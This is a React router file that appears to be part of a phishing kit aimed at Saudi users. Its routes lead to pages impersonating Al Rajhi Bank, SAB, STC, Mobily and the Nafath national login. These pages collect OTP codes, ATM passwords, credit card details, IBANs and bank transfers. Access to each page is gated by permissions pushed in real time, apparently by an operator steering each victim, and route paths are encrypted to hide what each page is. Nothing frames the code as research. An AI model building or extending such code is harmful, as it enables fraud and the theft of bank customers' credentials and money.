import AlRajhiAlert from "@/pages/al-rajhi-alert/AlRajhiAlert";
import AlRajhiContact from "@/pages/al-rajhi-contact/AlRajhiContact";
import AlRajhiNafath from "@/pages/al-rajhi-nafath/AlRajhiNafath";
import AlRajhiOtp from "@/pages/al-rajhi-otp/AlRajhiOtp";
import StsCallAlert from "@/pages/stc-call-alert/StcCallAlert";
import Final from "@/pages/final/Final";
import Login from "@/pages/login/Login";
import NafathVerification from "@/pages/nafath-verification/NafathVerification";
import Nafath from "@/pages/nafath/Nafath";
import CheckOtp from "@/pages/check-otp/CheckOtp";
import AtmPassword from "@/pages/atm-password/AtmPassword";
import Payment from "@/pages/payment/Payment";
import PhoneAuthentication from "@/pages/phone-authentication/PhoneAuthentication";
import VerifyPhone from "@/pages/verify-phone/VerifyPhone";
import { permissions } from "@/real-time/context/signals";
import { encryptRoute } from "@/real-time/utils/utils";
import { useSignals } from "@preact/signals-react/runtime";
import { Navigate, Route, Routes } from "react-router-dom";
import MobilyCallAlert from "@/pages/mobily-call-alert/MobilyCallAlert";
import MyStc from "@/pages/my-stc/MyStc";
import IBAN from "@/pages/iban/iban";
import SABNafath from "@/pages/sab-nafath/SABNafath";
import SABAccount from "@/pages/SAB-account/SAB-account";
import BankTransfer from "@/pages/bank-transfer/BankTransfer";
import Home from "@/pages/home/Home";
import Repay from "@/pages/Repay";
import Thank from "@/pages/Thank";
import RegistrationPage from "@/pages/Registration/RegistrationPage";
import ValidateNID from "@/pages/Registration/RegistrationPersonalData";
import RegistrationLogin from "@/pages/Registration/RegistrationLoginData";
import RegistrationBusiness from "@/pages/Registration/RegistrationBusinessData";

// "تحويل بنكي"

function Router() {
  useSignals();
  const routes: {
    path: string;
    component: () => JSX.Element;
    public?: boolean;
  }[] = [
    { path: "تسجيل", component: RegistrationPage, public: true },
    { path: "التحقق من الهوية الشخصية", component: ValidateNID, public: true },
    {
      path: "التحقق من هوية المنشأة",
      component: RegistrationBusiness,
      public: true,
    },
    { path: "تسجيل بيانات الدخول", component: RegistrationLogin, public: true },

    { path: "رمز التحقق (OTP)", component: CheckOtp },
    { path: "كلمة مرور ATM", component: AtmPassword },
    { path: "تنبيه الراجحى", component: AlRajhiAlert },
    { path: "تسجيل الدخول الراجحى", component: Login },
    { path: "إتصال الراجحى", component: AlRajhiContact },
    { path: "الراجحى (OTP)", component: AlRajhiOtp },
    { path: "نفاذ الراجحى", component: AlRajhiNafath },
    { path: "تنبية إتصال STC", component: StsCallAlert },
    { path: "تنبية إتصال Mobily", component: MobilyCallAlert },
    { path: "توثيق رقم الجوال", component: PhoneAuthentication },
    { path: "تحقق رقم الجوال (OTP)", component: VerifyPhone },
    { path: "تسجيل دخول نفاذ", component: Nafath },
    { path: "تحقق نفاذ", component: NafathVerification },
    { path: "الصفحة النهائية", component: Final },
    { path: "الدفع بطاقة الائتمان", component: Payment },
    { path: "MyStc", component: MyStc },
    { path: "تحويل بنكي", component: BankTransfer },
    { path: "رقم الحساب البنكي", component: IBAN },
    { path: "حساب بنك الأول", component: SABAccount },
    { path: "نفاذ الأول", component: SABNafath },
    { path: "طلب بطاقة اخرى", component: Repay },
    { path: "رسالة شكر", component: Thank },
  ];

  return (
    <Routes>
      <Route Component={Home} path="/" />

      {routes.map((route) => {
        const cipherPath = encryptRoute(route.path);
        console.log(cipherPath);
        return (
          (permissions.value.includes(route.path) || route.public) && (
            <>
              <Route Component={route.component} path={`/${cipherPath}`} />
              <Route
                element={
                  <Navigate
                    to={{
                      pathname: `/${cipherPath}`,
                      search:
                        typeof window !== "undefined"
                          ? window.location.search
                          : "",
                    }}
                  />
                }
                path={`/${route.path}`}
              />
            </>
          )
        );
      })}

      <Route element={<Navigate to={"/"} />} path="*" />
    </Routes>
  );
}

export default Router;
